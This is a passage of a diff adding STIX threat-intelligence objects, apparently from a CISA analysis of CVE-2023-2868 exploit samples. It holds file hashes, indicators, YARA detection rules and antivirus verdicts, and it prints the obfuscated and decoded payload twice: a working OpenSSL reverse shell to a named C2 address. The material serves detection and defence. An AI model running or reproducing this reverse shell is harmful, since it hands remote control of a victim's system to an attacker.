+            "description": "This artifact contains the same payloads as \u201c2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095.\u201d",
+            "malware_types": [
+                "backdoor",
+                "trojan"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--7a6c4f8e-086e-5b3d-9c6b-ba5483492f1a"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--69f75c99-6168-4228-9f2d-44778dbc9d3d",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1665808485-0a151737759a8a30001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='3e01f48ab1bfae888b2c580dbc6c5962' OR file:hashes.'SHA-1'='6f7d8d31d1d0c53d71495176aa4ab23756bbba24' OR file:hashes.'SHA-256'='0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6' OR file:hashes.'SHA-512'='ea5b2437c99c766050fddc2cad00b3d863ceae41d7d0be2b67ded74b146800de2ef7261d003d1bb341a8cff4ddd789f2c615daa423d9ab2a7f04b3a1d353d2eb']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.363939Z"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--c91a265f-ca19-521f-a859-a8f56bb30261",
+            "hashes": {
+                "MD5": "db1215b51c86aa12564dd5b825e81e43",
+                "SHA-1": "a3b9b846467973038b1232f2c2189c02023b1dd8",
+                "SHA-256": "b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321",
+                "SHA-512": "4b0be07290895cfae3e29d7675c83ee48e0f3eedab6be55db5d426799cbc25905eecfba92664bf3137c610cfca74826e2c2ec813ca6ff7c23c5584258219b478",
+                "SSDEEP": "96:LRKtqi+YiFOiclLs42dB+1jhtVP1rHNqudK3b7OKiTcGuRNdecg6dxkXBd6U2:Ny+xFJYLsfBkjhJLH4q6fbD"
+            },
+            "size": 29883,
+            "name": "1666582925-0a151727b55a9c0001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--66d21c74-738d-4f33-b188-04576f2d8173",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1666582925-0a151727b55a9c0001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains a payload that exploits CVE-2023-2868. The exploit payload is a shell script code with an embedded Base64 encoded reverse shell. Upon execution the malware Base64 decodes and executes the reverse shell code. The reverse shell establishes connections using the \"OpenSSL\" to the C2 IP \"107.148.223.196\" and port \u201c443\u201d and redirects the standard input and output to the named pipe at \"/tmp/p\" and then removes \"/tmp/p\" after the connection is closed.\r\n\r\n--Begin Encoded Payload--\r\n'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6NDQzID4vdG1wL3AgMj4vZGV2L251bGw7cm0gL3RtcC9wIg==;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\r\n--End Encoded Payload--\r\n\r\n--Begin Decoded Payload--\r\nsetsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107.148.223.196:443 >/tmp/p 2>/dev/null;rm /tmp/p\"\r\n--End Decoded Payload--",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_08 rule_content=rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\n\t\tSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\n\t\tSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\n\t\tSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\n\t\tSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\n\t\tSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\n\t\tSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\n\t\tSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\n\t\tSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\n\t\tSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\n\t\tSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\n\tstrings:\n\t\t$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n\t\t$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n\t\t$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n\t\t$s4 = { 5a 45 63 78 64 }\n\t\t$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n\t\t$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n\t\t$s7 = { 4c 6e 52 34 64 41 }\n\tcondition:\n\t\t5 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.38289Z"
+        },
+        {
+            "type": "malware-analysis",
+            "spec_version": "2.1",
+            "id": "malware-analysis--cb26f8ee-69a9-4967-ac0e-4fdff5008a6f",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "product": "eset",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "result_name": "Linux/Exploit.CVE-2023-2868.A trojan",
+            "result": "unknown",
+            "sample_ref": "file--c91a265f-ca19-521f-a859-a8f56bb30261"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--8bf737e1-6a3c-4513-a3f8-edadcc0e557b",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains a payload that exploits CVE-2023-2868. The exploit payload is a shell script code with an embedded Base64 encoded reverse shell. Upon execution the malware Base64 decodes and executes the reverse shell code. The reverse shell establishes connections using the \"OpenSSL\" to the C2 IP \"107.148.223.196\" and port \u201c443\u201d and redirects the standard input and output to the named pipe at \"/tmp/p\" and then removes \"/tmp/p\" after the connection is closed.\r\n\r\n--Begin Encoded Payload--\r\n'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6NDQzID4vdG1wL3AgMj4vZGV2L251bGw7cm0gL3RtcC9wIg==;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\r\n--End Encoded Payload--\r\n\r\n--Begin Decoded Payload--\r\nsetsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107.148.223.196:443 >/tmp/p 2>/dev/null;rm /tmp/p\"\r\n--End Decoded Payload--",
+            "malware_types": [
+                "backdoor",
+                "trojan"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--c91a265f-ca19-521f-a859-a8f56bb30261"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--91dd666b-2af1-4cfb-b7fd-de474b3b723d",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1666582925-0a151727b55a9c0001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='db1215b51c86aa12564dd5b825e81e43' OR file:hashes.'SHA-1'='a3b9b846467973038b1232f2c2189c02023b1dd8' OR file:hashes.'SHA-256'='b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321' OR file:hashes.'SHA-512'='4b0be07290895cfae3e29d7675c83ee48e0f3eedab6be55db5d426799cbc25905eecfba92664bf3137c610cfca74826e2c2ec813ca6ff7c23c5584258219b478']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.386636Z"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--f821908e-662a-5eac-b8d5-3e73681f87c3",
+            "hashes": {
+                "MD5": "c479667bd581845d1e295becc1d4859f",
+                "SHA-1": "a982111f1463e90a46a62da4fb8e47bbf4db025e",
+                "SHA-256": "b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2",
+                "SHA-512": "834fbf3c821a27588d6c7b46c56296505bdb9e34880e7c3c234c7fa3f9ee46c115d632d413f13278b9de792b5bd8e87ab561ad50bd8a25d43dbafa9b22b8bc30",
+                "SSDEEP": "96:GhKWqi+YDeiclHs42B+1jhtNzfH1rHNqudK3b7OKiTcGuRNdecg6dxkXBd6UG:Et+I5YHs7BkjhPLdLH4q6fbT"
+            },
+            "size": 29883,
+            "name": "1666583888-0a151727b45ada0001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--cb4b14c7-782c-4af7-b995-0ed1baf7a0de",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1666583888-0a151727b45ada0001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201cb5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.\u201d",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_08 rule_content=rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\n\t\tSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\n\t\tSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\n\t\tSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\n\t\tSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\n\t\tSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\n\t\tSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\n\t\tSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\n\t\tSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\n\t\tSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\n\t\tSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\n\tstrings:\n\t\t$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n\t\t$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n\t\t$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n\t\t$s4 = { 5a 45 63 78 64 }\n\t\t$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n\t\t$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n\t\t$s7 = { 4c 6e 52 34 64 41 }\n\tcondition:\n\t\t5 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.406881Z"
+        },
+        {
+            "type": "malware-analysis",
+            "spec_version": "2.1",
+            "id": "malware-analysis--b118ac5a-db70-4701-bff9-90513f5e5ca2",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "product": "eset",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "result_name": "Linux/Exploit.CVE-2023-2868.A trojan",
+            "result": "unknown",
+            "sample_ref": "file--f821908e-662a-5eac-b8d5-3e73681f87c3"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--f6c8112c-3600-4258-8a16-bbfdf47d1e55",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201cb5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.\u201d",
+            "malware_types": [
+                "trojan",
+                "backdoor"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--f821908e-662a-5eac-b8d5-3e73681f87c3"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--47251999-8052-4ae3-a0ec-7f716f758a76",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1666583888-0a151727b45ada0001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='c479667bd581845d1e295becc1d4859f' OR file:hashes.'SHA-1'='a982111f1463e90a46a62da4fb8e47bbf4db025e' OR file:hashes.'SHA-256'='b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2' OR file:hashes.'SHA-512'='834fbf3c821a27588d6c7b46c56296505bdb9e34880e7c3c234c7fa3f9ee46c115d632d413f13278b9de792b5bd8e87ab561ad50bd8a25d43dbafa9b22b8bc30']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.410786Z"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--0b3d261f-c4d6-5651-b734-f3e28181ece7",
+            "hashes": {
+                "MD5": "33d16ab60d262191f4a251e31a5d1940",
+                "SHA-1": "15e3a9a643ebc5fc8e240b2617ce9720e4c16aa2",
+                "SHA-256": "9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5",
+                "SHA-512": "feab76baea3e0701dd025b140cde25c1b7516ca9bca49ee8e3728b5d787e8a25ef456b094594f9fc30b89c64b776ab5120617ee4f2012d74f6327dff09f0c14f",
+                "SSDEEP": "96:q1Djqi+Yziclds42dB+1jhXIM1rHNqudK3b7OKiTcGuRNdecg6dxkXBd6UP:oj+VYdsfBkjhRLH4q6fbK"
+            },
+            "size": 29883,
+            "name": "1666612304-0a151727b165810001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--5152b031-6b77-4ff6-af66-f65d5586efe4",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1666612304-0a151727b165810001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201cb5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.\u201d",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_08 rule_content=rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\n\t\tSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\n\t\tSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\n\t\tSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\n\t\tSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\n\t\tSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\n\t\tSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\n\t\tSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\n\t\tSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\n\t\tSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\n\t\tSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\n\tstrings:\n\t\t$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n\t\t$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n\t\t$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n\t\t$s4 = { 5a 45 63 78 64 }\n\t\t$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n\t\t$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n\t\t$s7 = { 4c 6e 52 34 64 41 }\n\tcondition:\n\t\t5 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.430862Z"
+        },
+        {
+            "type": "malware-analysis",
+            "spec_version": "2.1",
+            "id": "malware-analysis--3987c364-089f-4277-89c8-00d531dc58e5",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "product": "eset",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "result_name": "Linux/Exploit.CVE-2023-2868.A trojan",
+            "result": "unknown",
+            "sample_ref": "file--0b3d261f-c4d6-5651-b734-f3e28181ece7"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--9c177434-9d70-4b8d-991d-4be51e5d0b6f",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201cb5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.\u201d",
+            "malware_types": [
+                "backdoor",
+                "trojan"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--0b3d261f-c4d6-5651-b734-f3e28181ece7"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--f3ee4135-bf70-4757-827e-9d53b157d6b3",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1666612304-0a151727b165810001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='33d16ab60d262191f4a251e31a5d1940' OR file:hashes.'SHA-1'='15e3a9a643ebc5fc8e240b2617ce9720e4c16aa2' OR file:hashes.'SHA-256'='9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5' OR file:hashes.'SHA-512'='feab76baea3e0701dd025b140cde25c1b7516ca9bca49ee8e3728b5d787e8a25ef456b094594f9fc30b89c64b776ab5120617ee4f2012d74f6327dff09f0c14f']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.43506Z"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--e3df5117-0591-588c-a9dc-af1f8b56f4e0",
+            "hashes": {
+                "MD5": "84603aa2f1d30f6b137a6b9300f2adcc",
+                "SHA-1": "ab9942e172733ec3265dd93e0033e2ace77905c1",
+                "SHA-256": "3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7",
+                "SHA-512": "96499176dc81f64f3ab0daf7319bd1dc54301ccaada75d37a8377584f6044774e103361f207f6f204e62f251ae41e639f923c25cf2feee5b2557d10908bb54c5",
+                "SSDEEP": "96:vm1soERqi+YhiclRs42dB+1jhXtH1rHNqudK3b7OKiTcGuRNdecg6dxkXBd6U+:+Eh+7YRsfBkjh7LH4q6fbL"
+            },
+            "size": 29883,
+            "name": "1666612441-0a151727b565980001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--6382f2fe-8600-4b71-9a9b-897807473fe7",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1666612441-0a151727b565980001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201cb5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.\u201d",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_08 rule_content=rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\n\t\tSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\n\t\tSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\n\t\tSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\n\t\tSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\n\t\tSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\n\t\tSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\n\t\tSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\n\t\tSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\n\t\tSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\n\t\tSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\n\tstrings:\n\t\t$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n\t\t$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n\t\t$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n\t\t$s4 = { 5a 45 63 78 64 }\n\t\t$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n\t\t$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n\t\t$s7 = { 4c 6e 52 34 64 41 }\n\tcondition:\n\t\t5 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.461671Z"
+        },
+        {
+            "type": "malware-analysis",
+            "spec_version": "2.1",
+            "id": "malware-analysis--31094741-d838-40cf-a890-42e0645e8f86",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "product": "eset",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "result_name": "Linux/Exploit.CVE-2023-2868.A trojan",
+            "result": "unknown",
+            "sample_ref": "file--e3df5117-0591-588c-a9dc-af1f8b56f4e0"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--8e37f58a-8c50-46e8-9373-0539bf3e1e8b",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201cb5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.\u201d",
+            "malware_types": [
+                "backdoor",
+                "trojan"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--e3df5117-0591-588c-a9dc-af1f8b56f4e0"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--b642ad71-bbf7-4ca3-9057-64aae4650dc3",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
